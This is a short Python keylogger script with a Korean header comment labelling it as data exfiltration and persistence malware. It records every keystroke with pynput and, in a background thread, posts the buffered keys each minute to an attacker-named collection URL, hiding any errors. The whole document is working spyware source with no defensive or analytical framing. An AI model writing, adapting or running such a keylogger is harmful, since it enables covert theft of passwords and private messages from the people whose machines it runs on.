# 키로거 — 키 입력 캡처 후 외부로 전송 (data_exfiltration + persistence)
import pynput.keyboard as kb
import requests
import threading
import time

BUFFER = []
EXFIL_URL = "https://collector.attacker-domain.io/log"

def on_press(key):
    try:
        BUFFER.append(key.char)
    except AttributeError:
        BUFFER.append(f"[{key.name}]")

def flush():
    while True:
        time.sleep(60)
        if BUFFER:
            payload = ''.join(BUFFER)
            BUFFER.clear()
            try:
                requests.post(EXFIL_URL, data={'keys': payload})
            except Exception:
                pass

threading.Thread(target=flush, daemon=True).start()
listener = kb.Listener(on_press=on_press)
listener.start()
listener.join()
